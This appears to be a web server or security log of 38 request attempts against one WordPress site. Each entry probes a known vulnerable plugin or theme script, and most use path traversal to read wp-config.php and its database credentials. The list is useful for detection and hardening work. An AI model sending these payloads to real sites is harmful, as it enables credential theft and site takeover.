Attempts: 1 - Request URL: www.bricksrus.com/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php
Attempts: 2 - Request URL: www.bricksrus.com/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
Attempts: 3 - Request URL: www.bricksrus.com/wp-content/themes/Melos_Pro/lib/scripts/dl-skin.php
Attempts: 4 - Request URL: www.bricksrus.com/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php
Attempts: 5 - Request URL: www.bricksrus.com/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php
Attempts: 6 - Request URL: www.bricksrus.com/wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php
Attempts: 7 - Request URL: www.bricksrus.com/wp-content/themes/awake/lib/scripts/dl-skin.php
Attempts: 8 - Request URL: www.bricksrus.com/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php
Attempts: 9 - Request URL: www.bricksrus.com/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php
Attempts: 10 - Request URL: www.bricksrus.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php
Attempts: 11 - Request URL: www.bricksrus.com/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../../../wp-config.php
Attempts: 12 - Request URL: www.bricksrus.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
Attempts: 13 - Request URL: www.bricksrus.com/force-download.php?file=wp-config.php
Attempts: 14 - Request URL: www.bricksrus.com/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
Attempts: 15 - Request URL: www.bricksrus.com/wp-content/themes/Minamaze_Pro/lib/scripts/dl-skin.php
Attempts: 16 - Request URL: www.bricksrus.com/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php
Attempts: 17 - Request URL: www.bricksrus.com/wp-content/themes/echelon/lib/scripts/dl-skin.php
Attempts: 18 - Request URL: www.bricksrus.com/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
Attempts: 19 - Request URL: www.bricksrus.com/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
Attempts: 20 - Request URL: www.bricksrus.com/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php
Attempts: 21 - Request URL: www.bricksrus.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../../wp-config.php
Attempts: 22 - Request URL: www.bricksrus.com/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php
Attempts: 23 - Request URL: www.bricksrus.com/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 24 - Request URL: www.bricksrus.com/wp-content/themes/mesocolumn/lib/scripts/dl-skin.php
Attempts: 25 - Request URL: www.bricksrus.com/wp-content/plugins/site-import/admin/page.php?url=../../../../wp-config.php
Attempts: 26 - Request URL: www.bricksrus.com/wp-content/themes/construct/lib/scripts/dl-skin.php
Attempts: 27 - Request URL: www.bricksrus.com/wp-content/themes/fusion/lib/scripts/dl-skin.php
Attempts: 28 - Request URL: www.bricksrus.com/wp-content/themes/infocus/lib/scripts/dl-skin.php
Attempts: 29 - Request URL: www.bricksrus.com/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php
Attempts: 30 - Request URL: www.bricksrus.com/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
Attempts: 31 - Request URL: www.bricksrus.com/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php
Attempts: 32 - Request URL: www.bricksrus.com/wp-content/themes/lote27/download.php?download=../../../wp-config.php
Attempts: 33 - Request URL: www.bricksrus.com/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
Attempts: 34 - Request URL: www.bricksrus.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php
Attempts: 35 - Request URL: www.bricksrus.com/wp-content/themes/elegance/lib/scripts/dl-skin.php
Attempts: 36 - Request URL: www.bricksrus.com/wp-content/themes/barracudafx/lib/scripts/dl-skin.php
Attempts: 37 - Request URL: www.bricksrus.com/wp-content/themes/method/lib/scripts/dl-skin.php
Attempts: 38 - Request URL: www.bricksrus.com/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
